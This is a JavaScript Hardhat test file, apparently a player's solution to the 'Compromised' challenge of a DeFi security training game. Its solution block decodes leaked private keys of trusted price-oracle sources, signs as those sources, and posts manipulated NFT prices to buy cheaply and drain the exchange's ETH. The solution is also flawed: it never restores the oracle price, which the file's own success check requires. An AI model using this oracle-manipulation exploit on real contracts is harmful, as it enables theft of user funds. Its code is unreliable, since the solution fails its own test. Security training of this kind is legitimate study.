const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );
        // ensure sources are setup as TRUSTED_SOURCE_ROLE
        let sourceRole = await oracle.TRUSTED_SOURCE_ROLE();
        for (let i = 0; i < await oracle.getRoleMemberCount(sourceRole); i++) {
            expect(await oracle.getRoleMember(sourceRole, i)).to.be.oneOf(sources);
        }

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        let rawData = [
            '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35', 
            '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'
        ];
        let keys = [], wallets = [];
        // get the private keys
        for (let i = 0; i < rawData.length; i++) {
            keys[i] = Buffer.from(
                Buffer.from(rawData[i].split(" ").join(""), "hex").toString("utf-8"), // from hex encoded to base64 encoded
                "base64"                                                              // from base64 encoded to plain string
            ).toString("utf-8");
        }
        // get the instance of wallets from keys
        for (let i = 0; i < keys.length; i++) {
            wallets[i] = new ethers.Wallet(keys[i], ethers.provider);
        }
        // ensure that sources belong to the wallets/keys
        for (let i = 0; i < wallets.length; i++) {
            expect(wallets[i].address).to.be.oneOf(sources);
        }

        // set the price to 0, as this would pass the onlyRole modifier
        for (let i = 0; i < wallets.length; i++) {
            await oracle.connect(wallets[i]).postPrice("DVNFT", 0);
        }
        expect(await oracle.getMedianPrice("DVNFT")).to.eq(0);

        // buy token:0 with an arbitrary value > 0, as the exchange will return the change
        await exchange.connect(player).buyOne({ value: 1n });
        expect(await nftToken.balanceOf(player.address)).to.eq(1);

        // set the price to the balance of exchange
        const exchangeBalance = await ethers.provider.getBalance(exchange.address);
        for (let i = 0; i < wallets.length; i++) {
            await oracle.connect(wallets[i]).postPrice("DVNFT", exchangeBalance);
        }
        expect(await oracle.getMedianPrice("DVNFT")).to.eq(exchangeBalance);

        // sell the token:0 to drain the exchange
        await nftToken.connect(player).approve(exchange.address, 0); // approve the exchange to transfer the token:0
        await exchange.connect(player).sellOne(0);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
